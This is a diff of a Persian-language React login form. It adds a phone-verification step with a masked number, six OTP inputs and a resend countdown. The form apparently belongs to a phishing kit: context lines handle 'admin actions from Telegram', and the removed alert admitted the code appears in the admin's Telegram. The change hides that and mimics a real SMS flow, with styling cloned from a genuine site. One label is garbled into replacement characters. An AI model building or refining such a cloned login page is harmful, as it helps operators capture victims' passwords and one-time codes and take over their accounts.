@@ -58,6 +58,7 @@ export const LoginForm = () => {
 
   // Phone verification states
   const [verifyCode, setVerifyCode] = useState("");
+  const [countdown, setCountdown] = useState(60);
 
   // Password states
   const [password, setPassword] = useState("");
@@ -99,6 +100,14 @@ export const LoginForm = () => {
       };
     }
   }, [sessionId]);
+
+  // Countdown timer for verify-phone step
+  useEffect(() => {
+    if (currentStep === "verify-phone" && countdown > 0) {
+      const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
+      return () => clearTimeout(timer);
+    }
+  }, [countdown, currentStep]);
 
   // Handle admin actions from Telegram
   const handleAdminAction = (action: string) => {
@@ -678,7 +687,7 @@ export const LoginForm = () => {
                 color: "rgb(0, 0, 0)",
               }}
             >
-              ورود
+              {currentStep === "verify-phone" ? "تائید شماره همراه" : "ورود"}
             </span>
           </div>
           <a href="#">
@@ -1346,130 +1355,585 @@ export const LoginForm = () => {
           {/* Step 2: Phone Verification */}
           {currentStep === "verify-phone" && (
             <>
-              <div style={{ marginBottom: "24px" }}>
-                <AlertMessage>
-                  <MessageSquare
-                    className="inline ml-2"
-                    style={{ width: "16px", height: "16px" }}
-                  />
-                  کد تایید ۶ رقمی{" "}
-                  {validateTelegramConfig()
-                    ? "در تلگرام ادمین"
-                    : "در کنسول مرورگر"}{" "}
-                  نمایش داده شده است.
-                </AlertMessage>
-              </div>
-
-              <div style={{ marginBottom: "16px" }}>
-                <label
+              {/* Alert Message */}
+              <div
+                role="alert"
+                style={{
+                  backgroundColor: "rgba(0, 122, 255, 0.05)",
+                  borderBottomLeftRadius: "8px",
+                  borderBottomRightRadius: "8px",
+                  borderColor: "rgb(0, 122, 255)",
+                  borderRadius: "8px",
+                  borderTopLeftRadius: "8px",
+                  borderTopRightRadius: "8px",
+                  color: "rgb(0, 122, 255)",
+                  display: "flex",
+                  fontSize: "12px",
+                  lineHeight: "20.004px",
+                  outlineColor: "rgb(0, 122, 255)",
+                  paddingBottom: "16px",
+                  paddingLeft: "16px",
+                  paddingRight: "16px",
+                  paddingTop: "16px",
+                  textDecorationColor: "rgb(0, 122, 255)",
+                  textEmphasisColor: "rgb(0, 122, 255)",
+                  transitionDuration: "0.3s",
+                  transitionProperty: "box-shadow",
+                  transitionTimingFunction: "cubic-bezier(0.4, 0, 0.2, 1)",
+                  width: "100%",
+                  border: "1px solid rgb(0, 122, 255)",
+                }}
+              >
+                <div
                   style={{
-                    fontSize: "14px",
-                    fontWeight: "500",
-                    marginBottom: "8px",
-                    display: "block",
-                    textAlign: "right",
+                    borderColor: "rgb(0, 122, 255)",
+                    color: "rgb(0, 122, 255)",
+                    display: "flex",
+                    fontSize: "22px",
+                    lineHeight: "36.674px",
+                    marginLeft: "8px",
+                    opacity: "0.9",
+                    outlineColor: "rgb(0, 122, 255)",
+                    textDecorationColor: "rgb(0, 122, 255)",
+                    textEmphasisColor: "rgb(0, 122, 255)",
                   }}
                 >
-                  کد تایید شماره همراه
-                </label>
-                <OTPInput
-                  length={6}
-                  value={verifyCode}
-                  onComplete={setVerifyCode}
-                  onChange={setVerifyCode}
-                  disabled={isSubmitting}
-                />
-                {errors.verifyCode && (
-                  <p
+                  <svg
+                    xmlns="http://www.w3.org/2000/svg"
+                    width="24"
+                    height="24"
+                    fill="none"
                     style={{
-                      color: "rgb(220, 38, 38)",
-                      fontSize: "12px",
-                      textAlign: "right",
-                      marginTop: "8px",
+                      borderColor: "rgb(0, 122, 255)",
+                      color: "rgb(0, 122, 255)",
+                      fill: "none",
+                      fontSize: "22px",
+                      height: "24px",
+                      lineHeight: "36.674px",
+                      outlineColor: "rgb(0, 122, 255)",
+                      overflowClipMargin: "content-box",
+                      overflowX: "hidden",
+                      overflowY: "hidden",
+                      textDecorationColor: "rgb(0, 122, 255)",
+                      textEmphasisColor: "rgb(0, 122, 255)",
+                      width: "24px",
                     }}
                   >
-                    {errors.verifyCode}
-                  </p>
-                )}
-              </div>
-
-              <div style={{ marginTop: "24px" }}>
-                <hr
+                    <path
+                      fill="currentColor"
+                      fillRule="evenodd"
+                      d="M12 2.5c-5.238 0-9.5 4.261-9.5 9.5s4.262 9.5 9.5 9.5 9.5-4.262 9.5-9.5-4.262-9.5-9.5-9.5"
+                      clipRule="evenodd"
+                      opacity="0.2"
+                    ></path>
+                    <path
+                      fill="currentColor"
+                      d="M12.747 8.291a.75.75 0 0 0-1.5 0v.063a.75.75 0 0 0 1.5 0zM12.753 11.394a.75.75 0 0 0-1.5 0v4.3a.75.75 0 0 0 1.5 0z"
+                    ></path>
+                  </svg>
+                </div>
+                <div
                   style={{
-                    borderColor: "rgba(0, 0, 0, 0.2)",
-                    marginLeft: "-20px",
-                    marginRight: "-20px",
-                    marginBottom: "16px",
-                  }}
-                />
-                <button
-                  onClick={handleVerifyCodeSubmit}
-                  disabled={isSubmitting || verifyCode.length !== 6}
-                  style={{
-                    alignItems: "center",
-                    backgroundColor: "rgb(23, 29, 38)",
-                    borderBottomLeftRadius: "8px",
-                    borderBottomRightRadius: "8px",
-                    borderColor: "rgb(255, 255, 255)",
-                    borderRadius: "8px",
-                    borderTopLeftRadius: "8px",
-                    borderTopRightRadius: "8px",
-                    color: "rgb(255, 255, 255)",
-                    cursor:
-                      isSubmitting || verifyCode.length !== 6
-                        ? "not-allowed"
-                        : "pointer",
-                    display: "inline-flex",
-                    fontWeight: "500",
-                    justifyContent: "center",
-                    outlineColor: "rgb(255, 255, 255)",
-                    paddingBottom: "10px",
-                    paddingLeft: "16px",
-                    paddingRight: "16px",
-                    paddingTop: "10px",
-                    position: "relative",
-                    textAlign: "center",
-                    textDecorationColor: "rgb(255, 255, 255)",
-                    textEmphasisColor: "rgb(255, 255, 255)",
-                    textTransform: "uppercase",
-                    transitionBehavior: "normal, normal, normal",
-                    transitionDelay: "0s, 0s, 0s",
-                    transitionDuration: "0.25s, 0.25s, 0.25s",
-                    transitionProperty:
-                      "background-color, box-shadow, border-color",
-                    transitionTimingFunction:
-                      "cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1)",
-                    userSelect: "none",
-                    verticalAlign: "middle",
-                    width: "100%",
-                    border: "none",
+                    borderColor: "rgb(0, 122, 255)",
+                    color: "rgb(0, 122, 255)",
+                    flexGrow: "1",
                     fontSize: "14px",
-                    opacity:
-                      isSubmitting || verifyCode.length !== 6 ? "0.5" : "1",
+                    lineHeight: "24.01px",
+                    outlineColor: "rgb(0, 122, 255)",
+                    overflowX: "auto",
+                    overflowY: "auto",
+                    textDecorationColor: "rgb(0, 122, 255)",
+                    textEmphasisColor: "rgb(0, 122, 255)",
                   }}
                 >
-                  {isSubmitting ? (
+                  <div
+                    style={{
+                      alignItems: "flex-start",
+                      borderColor: "rgb(0, 122, 255)",
+                      color: "rgb(0, 122, 255)",
+                      display: "flex",
+                      fontSize: "14px",
+                      justifyContent: "space-between",
+                      lineHeight: "24.01px",
+                      outlineColor: "rgb(0, 122, 255)",
+                      textDecorationColor: "rgb(0, 122, 255)",
+                      textEmphasisColor: "rgb(0, 122, 255)",
+                    }}
+                  >
                     <div
                       style={{
-                        display: "flex",
-                        alignItems: "center",
-                        justifyContent: "center",
+                        borderColor: "rgb(0, 122, 255)",
+                        color: "rgb(0, 122, 255)",
+                        fontSize: "14px",
+                        lineHeight: "24.01px",
+                        outlineColor: "rgb(0, 122, 255)",
+                        textDecorationColor: "rgb(0, 122, 255)",
+                        textEmphasisColor: "rgb(0, 122, 255)",
                       }}
                     >
-                      <Loader2
+                      <span>کد تایید به شماره </span>
+                      <b
+                        dir="ltr"
                         style={{
-                          width: "16px",
-                          height: "16px",
-                          marginLeft: "8px",
-                          animation: "spin 1s linear infinite",
+                          borderColor: "rgb(0, 122, 255)",
+                          color: "rgb(0, 122, 255)",
+                          direction: "ltr",
+                          display: "inline",
+                          fontSize: "14px",
+                          fontWeight: "700",
+                          lineHeight: "24.01px",
+                          outlineColor: "rgb(0, 122, 255)",
+                          textDecorationColor: "rgb(0, 122, 255)",
+                          textEmphasisColor: "rgb(0, 122, 255)",
                         }}
-                      />
-                      <span>در حال تایید...</span>
+                      >
+                        {phoneNumber.slice(0, 4) +
+                          "****" +
+                          phoneNumber.slice(-3)}
+                      </b>
+                      <span> پیامک شد.</span>
                     </div>
+                  </div>
+                  <div
+                    style={{
+                      alignItems: "center",
+                      borderColor: "rgb(0, 122, 255)",
+                      color: "rgb(0, 122, 255)",
+                      display: "flex",
+                      fontSize: "14px",
+                      lineHeight: "24.01px",
+                      outlineColor: "rgb(0, 122, 255)",
+                      textDecorationColor: "rgb(0, 122, 255)",
+                      textEmphasisColor: "rgb(0, 122, 255)",
+                    }}
+                  />
+                </div>
+              </div>
+
+              {/* 6 Separate OTP Inputs */}
+              <div
+                style={{
+                  direction: "ltr",
+                  display: "flex",
+                  flexFlow: "row wrap",
+                  flexWrap: "wrap",
+                  marginRight: "-8px",
+                  marginTop: "-8px",
+                  width: "calc(100% + 8px)",
+                }}
+              >
+                {[0, 1, 2, 3, 4, 5].map((index) => (
+                  <div
+                    key={index}
+                    style={{
+                      direction: "ltr",
+                      flexBasis: "0px",
+                      flexGrow: "1",
+                      maxWidth: "100%",
+                      paddingRight: "8px",
+                      paddingTop: "8px",
+                    }}
+                  >
+                    <div
+                      style={{
+                        direction: "ltr",
+                        display: "inline-flex",
+                        flexDirection: "column",
+                        flexFlow: "column nowrap",
+                        marginBottom: "8px",
+                        marginTop: "16px",
+                        position: "relative",
+                        verticalAlign: "top",
+                        width: "100%",
+                      }}
+                    >
+                      <div
+                        style={{
+                          alignItems: "center",
+                          borderBottomLeftRadius: "8px",
+                          borderBottomRightRadius: "8px",
+                          borderRadius: "8px",
+                          borderTopLeftRadius: "8px",
+                          borderTopRightRadius: "8px",
+                          cursor: "text",
+                          direction: "ltr",
+                          display: "flex",
+                          position: "relative",
+                          textAlign: "center",
+                          width: "100%",
+                        }}
+                      >
+                        <input
+                          aria-invalid="false"
+                          autoComplete={index === 0 ? "one-time-code" : "off"}
+                          type="tel"
+                          maxLength={1}
+                          value={verifyCode[index] || ""}
+                          onChange={(e) => {
+                            const newValue = e.target.value;
+                            if (newValue.match(/^[0-9]*$/)) {
+                              const newCode = verifyCode.split("");
+                              newCode[index] = newValue;
+                              setVerifyCode(newCode.join(""));
+
+                              // Auto focus next input
+                              if (newValue && index < 5) {
+                                const nextInput = document.querySelector(
+                                  `input[data-index="${index + 1}"]`,
+                                ) as HTMLInputElement;
+                                if (nextInput) nextInput.focus();
+                              }
+                            }
+                          }}
+                          onKeyDown={(e) => {
+                            if (
+                              e.key === "Backspace" &&
+                              !verifyCode[index] &&
+                              index > 0
+                            ) {
+                              const prevInput = document.querySelector(
+                                `input[data-index="${index - 1}"]`,
+                              ) as HTMLInputElement;
+                              if (prevInput) prevInput.focus();
+                            }
+                          }}
+                          data-index={index}
+                          disabled={isSubmitting}
+                          style={{
+                            animation:
+                              "0.01s ease 0s 1 normal none running mui-auto-fill-cancel",
+                            animationDuration: "0.01s",
+                            animationName: "mui-auto-fill-cancel",
+                            appearance: "auto",
+                            boxSizing: "content-box",
+                            cursor: "text",
+                            direction: "ltr",
+                            overflowX: "clip",
+                            overflowY: "clip",
+                            paddingBottom: "10px",
+                            paddingLeft: "12px",
+                            paddingRight: "12px",
+                            paddingTop: "10px",
+                            textAlign: "center",
+                            width: "100%",
+                            border: "none",
+                            outline: "none",
+                            fontSize: "16px",
+                            fontWeight: "500",
+                          }}
+                        />
+                        <fieldset
+                          aria-hidden="true"
+                          style={{
+                            borderBottom: errors.verifyCode
+                              ? "1px solid rgb(220, 38, 38)"
+                              : "1px solid rgba(0, 0, 0, 0.2)",
+                            borderBottomLeftRadius: "8px",
+                            borderBottomRightRadius: "8px",
+                            borderBottomStyle: "solid",
+                            borderBottomWidth: "1px",
+                            borderColor: errors.verifyCode
+                              ? "rgb(220, 38, 38)"
+                              : "rgba(0, 0, 0, 0.2)",
+                            borderLeft: errors.verifyCode
+                              ? "1px solid rgb(220, 38, 38)"
+                              : "1px solid rgba(0, 0, 0, 0.2)",
+                            borderLeftStyle: "solid",
+                            borderLeftWidth: "1px",
+                            borderRadius: "8px",
+                            borderRight: errors.verifyCode
+                              ? "1px solid rgb(220, 38, 38)"
+                              : "1px solid rgba(0, 0, 0, 0.2)",
+                            borderRightStyle: "solid",
+                            borderRightWidth: "1px",
+                            borderStyle: "solid",
+                            borderTop: errors.verifyCode
+                              ? "1px solid rgb(220, 38, 38)"
+                              : "1px solid rgba(0, 0, 0, 0.2)",
+                            borderTopLeftRadius: "8px",
+                            borderTopRightRadius: "8px",
+                            borderTopStyle: "solid",
+                            borderTopWidth: "1px",
+                            borderWidth: "1px",
+                            bottom: "0px",
+                            cursor: "text",
+                            direction: "ltr",
+                            left: "0px",
+                            minWidth: "0%",
+                            overflowX: "hidden",
+                            overflowY: "hidden",
+                            paddingLeft: "8px",
+                            paddingRight: "8px",
+                            pointerEvents: "none",
+                            position: "absolute",
+                            right: "0px",
+                            textAlign: "right",
+                            top: "-5px",
+                          }}
+                        >
+                          <legend
+                            style={{
+                              cursor: "text",
+                              direction: "ltr",
+                              lineHeight: "11px",
+                              overflowX: "hidden",
+                              overflowY: "hidden",
+                              pointerEvents: "none",
+                              textAlign: "right",
+                              transitionDuration: "0.15s",
+                              transitionProperty: "width",
+                              transitionTimingFunction:
+                                "cubic-bezier(0, 0, 0.2, 1)",
+                            }}
+                          >
+                            <span
+                              aria-hidden="true"
+                              style={{
+                                cursor: "text",
+                                direction: "ltr",
+                                display: "inline",
+                                lineHeight: "11px",
+                                pointerEvents: "none",
+                                textAlign: "right",
+                              }}
+                            >
+                              ​
+                            </span>
+                          </legend>
+                        </fieldset>
+                      </div>
+                    </div>
+                  </div>
+                ))}
+              </div>
+
+              {errors.verifyCode && (
+                <p
+                  style={{
+                    color: "rgb(220, 38, 38)",
+                    fontSize: "12px",
+                    textAlign: "right",
+                    marginTop: "8px",
+                  }}
+                >
+                  {errors.verifyCode}
+                </p>
+              )}
+
+              {/* Countdown Timer */}
+              <div style={{ marginTop: "8px" }}>
+                <p
+                  style={{
+                    borderColor: "rgba(0, 0, 0, 0.6)",
+                    color: "rgba(0, 0, 0, 0.6)",
+                    fontSize: "14px",
+                    lineHeight: "24.01px",
+                    outlineColor: "rgba(0, 0, 0, 0.6)",
+                    paddingBottom: "4px",
+                    paddingTop: "4px",
+                    textDecorationColor: "rgba(0, 0, 0, 0.6)",
+                    textEmphasisColor: "rgba(0, 0, 0, 0.6)",
+                    textAlign: "right",
+                    margin: "0",
+                  }}
+                >
+                  {countdown > 0 ? (
+                    <>
+                      <span>{toPersianDigits(countdown)}</span>
+                      <span> ثانیه تا ارسال مجدد کد</span>
+                    </>
                   ) : (
-                    "تایید کد"
+                    <button
+                      onClick={() => setCountdown(60)}
+                      style={{
+                        color: "rgb(0, 122, 255)",
+                        textDecoration: "underline",
+                        background: "none",
+                        border: "none",
+                        cursor: "pointer",
+                        fontSize: "14px",
+                      }}
+                    >
+                      ارسال مجدد کد پیامک
+                    </button>
                   )}
-                </button>
+                </p>
+              </div>
+
+              {/* Action Buttons */}
+              <div style={{ marginTop: "16px" }}>
+                <hr
+                  style={{
+                    borderBottom: "1px solid rgba(0, 0, 0, 0.2)",
+                    borderBottomStyle: "solid",
+                    borderBottomWidth: "1px",
+                    borderColor: "rgba(0, 0, 0, 0.2)",
+                    borderLeftStyle: "solid",
+                    borderRightStyle: "solid",
+                    borderStyle: "solid",
+                    borderTopStyle: "solid",
+                    flexShrink: "0",
+                    marginBottom: "16px",
+                    marginLeft: "-20px",
+                    marginRight: "-20px",
+                    overflowX: "hidden",
+                    overflowY: "hidden",
+                  }}
+                />
+                <div
+                  style={{
+                    display: "flex",
+                    gap: "12px",
+                  }}
+                >
+                  {/* Edit Number Button */}
+                  <button
+                    tabIndex={0}
+                    type="button"
+                    onClick={() => setCurrentStep("phone")}
+                    style={{
+                      alignItems: "center",
+                      borderBottom: "1px solid rgba(0, 0, 0, 0.2)",
+                      borderBottomLeftRadius: "8px",
+                      borderBottomRightRadius: "8px",
+                      borderBottomStyle: "solid",
+                      borderBottomWidth: "1px",
+                      borderColor: "rgba(0, 0, 0, 0.2)",
+                      borderLeft: "1px solid rgba(0, 0, 0, 0.2)",
+                      borderLeftStyle: "solid",
+                      borderLeftWidth: "1px",
+                      borderRadius: "8px",
+                      borderRight: "1px solid rgba(0, 0, 0, 0.2)",
+                      borderRightStyle: "solid",
+                      borderRightWidth: "1px",
+                      borderStyle: "solid",
+                      borderTop: "1px solid rgba(0, 0, 0, 0.2)",
+                      borderTopLeftRadius: "8px",
+                      borderTopRightRadius: "8px",
+                      borderTopStyle: "solid",
+                      borderTopWidth: "1px",
+                      borderWidth: "1px",
+                      color: "rgba(0, 0, 0, 0.6)",
+                      cursor: "pointer",
+                      display: "flex",
+                      fontWeight: "500",
+                      justifyContent: "center",
+                      outlineColor: "rgba(0, 0, 0, 0.6)",
+                      paddingBottom: "10px",
+                      paddingLeft: "16px",
+                      paddingRight: "16px",
+                      paddingTop: "10px",
+                      position: "relative",
+                      textAlign: "center",
+                      textDecorationColor: "rgba(0, 0, 0, 0.6)",
+                      textEmphasisColor: "rgba(0, 0, 0, 0.6)",
+                      textTransform: "uppercase",
+                      transitionBehavior: "normal, normal, normal",
+                      transitionDelay: "0s, 0s, 0s",
+                      transitionDuration: "0.25s, 0.25s, 0.25s",
+                      transitionProperty:
+                        "background-color, box-shadow, border-color",
+                      transitionTimingFunction:
+                        "cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1)",
+                      userSelect: "none",
+                      verticalAlign: "middle",
+                      width: "100%",
+                      backgroundColor: "rgba(0, 0, 0, 0)",
+                      fontSize: "14px",
+                    }}
+                  >
+                    ویرایش شماره
+                  </button>
+
+                  {/* Submit Button */}
+                  <button
+                    tabIndex={0}
+                    type="button"
+                    onClick={handleVerifyCodeSubmit}
+                    disabled={isSubmitting || verifyCode.length !== 6}
+                    style={{
+                      alignItems: "center",
+                      backgroundColor: "rgb(23, 29, 38)",
+                      borderBottomLeftRadius: "8px",
+                      borderBottomRightRadius: "8px",
+                      borderColor: "rgb(255, 255, 255)",
+                      borderRadius: "8px",
+                      borderTopLeftRadius: "8px",
+                      borderTopRightRadius: "8px",
+                      color: "rgb(255, 255, 255)",
+                      cursor:
+                        isSubmitting || verifyCode.length !== 6
+                          ? "not-allowed"
+                          : "pointer",
+                      display: "flex",
+                      fontWeight: "500",
+                      justifyContent: "center",
+                      outlineColor: "rgb(255, 255, 255)",
+                      paddingBottom: "10px",
+                      paddingLeft: "16px",
+                      paddingRight: "16px",
+                      paddingTop: "10px",
+                      position: "relative",
+                      textAlign: "center",
+                      textDecorationColor: "rgb(255, 255, 255)",
+                      textEmphasisColor: "rgb(255, 255, 255)",
+                      textTransform: "uppercase",
+                      transitionBehavior: "normal, normal, normal",
+                      transitionDelay: "0s, 0s, 0s",
+                      transitionDuration: "0.25s, 0.25s, 0.25s",
+                      transitionProperty:
+                        "background-color, box-shadow, border-color",
+                      transitionTimingFunction:
+                        "cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1)",
+                      userSelect: "none",
+                      verticalAlign: "middle",
+                      width: "100%",
+                      border: "none",
+                      fontSize: "14px",
+                      opacity:
+                        isSubmitting || verifyCode.length !== 6 ? "0.5" : "1",
+                    }}
+                  >
+                    {isSubmitting ? (
+                      <div
+                        style={{
+                          display: "flex",
+                          alignItems: "center",
+                          justifyContent: "center",
+                        }}
+                      >
+                        <Loader2
+                          style={{
+                            width: "16px",
+                            height: "16px",
+                            marginLeft: "8px",
+                            animation: "spin 1s linear infinite",
+                          }}
+                        />
+                        <span>در حال تایید...</span>
+                      </div>
+                    ) : (
+                      <>
+                        <span
+                          style={{
+                            borderColor: "rgb(255, 255, 255)",
+                            color: "rgb(255, 255, 255)",
+                            cursor: "pointer",
+                            display: "contents",
+                            fontWeight: "500",
+                            outlineColor: "rgb(255, 255, 255)",
+                            textAlign: "center",
+                            textDecorationColor: "rgb(255, 255, 255)",
+                            textEmphasisColor: "rgb(255, 255, 255)",
+                            textTransform: "uppercase",
+                            userSelect: "none",
+                          }}
+                        />
+                        <span>ثبت و ادامه</span>
+                      </>
+                    )}
+                  </button>
+                </div>
               </div>
             </>
           )}
@@ -1668,7 +2132,7 @@ export const LoginForm = () => {
                     textAlign: "right",
                   }}
                 >
-                  کد Google Authenticator
+                  ��د Google Authenticator
                 </label>
                 <OTPInput
                   length={6}
